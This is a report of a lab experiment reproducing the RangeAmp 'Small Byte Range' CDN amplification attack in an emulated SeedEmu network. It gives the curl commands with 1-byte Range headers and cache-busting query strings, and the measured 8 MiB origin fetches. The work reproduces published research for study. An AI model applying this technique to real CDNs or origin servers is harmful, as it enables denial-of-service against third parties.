# RangeAmp SBR Experiment Report

## Overview

This document describes a reproducible experiment for the paper:

- **CDN Backfired: Amplification Attacks Based on HTTP Range Requests**
- Paper link: [DSN 2020 paper PDF](https://netsec.ccert.edu.cn/files/papers/cdn-backfire-dsn2020.pdf)

The goal is to reproduce the core mechanism of the **Small Byte Range (SBR)**
attack in a controlled SeedEmu environment.

The experiment is implemented in:

- `examples/internet/B30_CDN/amplification_attack/rangeamp_sbr.py`

The baseline CDN example remains:

- `examples/internet/B30_CDN/cdn.py`


## Attack Idea

The SBR attack abuses an incorrect CDN behavior during a **cache miss**:

1. A client sends a very small range request, for example:
   - `Range: bytes=0-0`
2. The CDN edge receives the request and notices that the object is not cached.
3. Instead of forwarding the `Range` request to the origin, the edge **deletes**
   the `Range` header and fetches the **entire object** from the origin.
4. After receiving the full object, the edge returns only the requested small
   byte range to the client.

As a result:

- the client sends a small request,
- the client receives only a tiny response,
- but the origin sends a large object to the CDN.

This creates a large amplification effect on the origin-facing traffic.


## Why Cache Miss Matters

The attack is effective only when the edge does not already have the object in
cache.

- If the object is already cached, the edge can serve the requested byte range
  directly from the local cache.
- If the object is not cached, the buggy edge behavior causes a full-object
  fetch from the origin.

In this experiment, cache miss is triggered by varying the query string:

- `/large.bin?run=1`
- `/large.bin?run=2`
- `/large.bin?run=3`

The edge uses the full URL as the cache key, so each new query string is
treated as a new object and causes another cache miss.


## What Was Added on Top of `cdn.py`

The experiment does **not** modify `examples/internet/B30_CDN/cdn.py`.
Instead, it creates a separate topology in
`examples/internet/B30_CDN/amplification_attack/rangeamp_sbr.py`,
reusing the same mini-Internet style deployment.

Compared with the baseline CDN example, the experiment adds the following
components:

1. A dedicated **attack edge site**
   - `AS181`
   - edge IP: `10.181.0.100`
   - origin IP: `10.181.0.10`

2. A simplified **single DNS server**
   - `AS150`
   - IP: `10.150.0.53`
   - returns `www.example.com -> 10.181.0.100`

3. A custom **origin server**
   - implemented in Python inside the emulated node
   - exposes:
     - `/large.bin`
     - `/__stats`
   - always returns the entire object for `/large.bin`
   - object size is `8 MiB`

4. A custom **buggy edge server**
   - implemented in Python inside the emulated node
   - exposes:
     - `/large.bin`
     - `/__stats`
   - supports range responses to clients
   - but on cache miss it fetches the full object from origin without keeping
     the client's `Range` restriction

5. Built-in **measurement counters**
   - edge counters:
     - `client_requests`
     - `range_requests`
     - `client_bytes_sent`
     - `origin_fetches`
     - `origin_bytes`
     - `cache_hits`
     - `cache_misses`
     - `amplification`
   - origin counters:
     - `requests`
     - `bytes_sent`
     - `last_path`


## Topology

The experiment uses the mini Internet as the base topology.

- Clients are standard stub-AS hosts from the mini Internet.
- DNS resolves `www.example.com` to the attack edge.
- The edge forwards toward the origin inside the CDN site.

Logical request path:

1. client
2. DNS
3. edge
4. origin


## Running the Experiment

Generate the Docker output:

```bash
cd examples/internet/B30_CDN/amplification_attack
conda run -n seedpy310 python rangeamp_sbr.py amd
```

This creates:

```bash
examples/internet/B30_CDN/amplification_attack/output
```

Start Docker manually:

```bash
cd examples/internet/B30_CDN/amplification_attack/output
docker compose build
docker compose up -d
```

Wait about 1-2 minutes for routing and services to converge.


## Validation Commands

Validate DNS from a client, for example `AS150`:

```bash
docker exec -it as150h-host_0-10.150.0.71 sh -lc "getent ahostsv4 www.example.com"
```

Expected result:

```text
10.181.0.100
```

Send the first attack request:

```bash
docker exec -it as150h-host_0-10.150.0.71 sh -lc "curl --noproxy '*' -s -D /tmp/headers.txt -o /tmp/body.bin -H 'Range: bytes=0-0' 'http://www.example.com:8080/large.bin?run=1'"
docker exec -it as150h-host_0-10.150.0.71 sh -lc "cat /tmp/headers.txt"
docker exec -it as150h-host_0-10.150.0.71 sh -lc "wc -c /tmp/body.bin"
```

Inspect edge and origin statistics:

```bash
docker exec -it as150h-host_0-10.150.0.71 sh -lc "curl --noproxy '*' -s http://www.example.com:8080/__stats"
docker exec -it as150h-host_0-10.150.0.71 sh -lc "curl --noproxy '*' -s http://10.181.0.10:8080/__stats"
```

Repeat the same URL to validate cache hit:

```bash
docker exec -it as150h-host_0-10.150.0.71 sh -lc "curl --noproxy '*' -s -D /tmp/headers2.txt -o /tmp/body2.bin -H 'Range: bytes=0-0' 'http://www.example.com:8080/large.bin?run=1'"
docker exec -it as150h-host_0-10.150.0.71 sh -lc "cat /tmp/headers2.txt"
```

Use a different query string to trigger another cache miss:

```bash
docker exec -it as150h-host_0-10.150.0.71 sh -lc "curl --noproxy '*' -s -D /tmp/headers3.txt -o /tmp/body3.bin -H 'Range: bytes=0-0' 'http://www.example.com:8080/large.bin?run=2'"
docker exec -it as150h-host_0-10.150.0.71 sh -lc "cat /tmp/headers3.txt"
```


## Observed Results

The following results were obtained during the experiment.

### Step 1: First Request, Cache Miss

Request:

```bash
curl --noproxy '*' -s -D /tmp/headers.txt -o /tmp/body.bin -H 'Range: bytes=0-0' 'http://www.example.com:8080/large.bin?run=1'
```

Observed response headers:

```text
HTTP/1.0 206 Partial Content
X-RangeAmp-Cache: MISS
X-RangeAmp-Origin-Bytes: 8388608
Content-Length: 1
Content-Range: bytes 0-0/8388608
```

Observed response body length:

```text
1 byte
```

Observed edge stats:

```json
{"client_requests": 1, "range_requests": 1, "client_bytes_sent": 1, "origin_fetches": 1, "origin_bytes": 8388608, "cache_hits": 0, "cache_misses": 1, "site_id": "nyc", "role": "edge", "attack_model": "Deletion-based SBR", "amplification": 8388608.0}
```

Observed origin stats:

```json
{"requests": 1, "bytes_sent": 8388608, "last_path": "/large.bin?run=1", "object_size": 8388608, "site_id": "nyc", "role": "origin"}
```

Interpretation:

- the client received only `1` byte,
- the edge fetched `8388608` bytes from the origin,
- the amplification factor for this miss was `8388608x`.


### Step 2: Same URL, Cache Hit

Observed response headers:

```text
HTTP/1.0 206 Partial Content
X-RangeAmp-Cache: HIT
X-RangeAmp-Origin-Bytes: 8388608
Content-Length: 1
```

Observed edge stats:

```json
{"client_requests": 2, "range_requests": 2, "client_bytes_sent": 2, "origin_fetches": 1, "origin_bytes": 8388608, "cache_hits": 1, "cache_misses": 1, "site_id": "nyc", "role": "edge", "attack_model": "Deletion-based SBR", "amplification": 4194304.0}
```

Observed origin stats:

```json
{"requests": 1, "bytes_sent": 8388608, "last_path": "/large.bin?run=1", "object_size": 8388608, "site_id": "nyc", "role": "origin"}
```

Interpretation:

- the second request hit the edge cache,
- the origin was not contacted again,
- amplification did not increase further for the same cache key.


### Step 3: Different URL, New Cache Miss

Request:

```bash
curl --noproxy '*' -s -D /tmp/headers3.txt -o /tmp/body3.bin -H 'Range: bytes=0-0' 'http://www.example.com:8080/large.bin?run=2'
```

Observed response headers:

```text
HTTP/1.0 206 Partial Content
X-RangeAmp-Cache: MISS
X-RangeAmp-Origin-Bytes: 8388608
Content-Length: 1
```

Observed edge stats:

```json
{"client_requests": 3, "range_requests": 3, "client_bytes_sent": 3, "origin_fetches": 2, "origin_bytes": 16777216, "cache_hits": 1, "cache_misses": 2, "site_id": "nyc", "role": "edge", "attack_model": "Deletion-based SBR", "amplification": 5592405.33}
```

Observed origin stats:

```json
{"requests": 2, "bytes_sent": 16777216, "last_path": "/large.bin?run=2", "object_size": 8388608, "site_id": "nyc", "role": "origin"}
```

Interpretation:

- changing the query string created a new cache key,
- the new cache key caused another miss,
- the edge again fetched the full object from the origin,
- the attack can therefore be repeated by continuously varying the URL.


## Main Findings

This experiment confirms the core SBR mechanism:

1. A tiny byte-range request can trigger a full-object origin fetch.
2. The amplification happens only on cache miss.
3. Cache hit suppresses further origin traffic for the same key.
4. Varying the cache key re-enables the attack.

In this setup, a request for `1` byte forced the origin to send `8 MiB`.
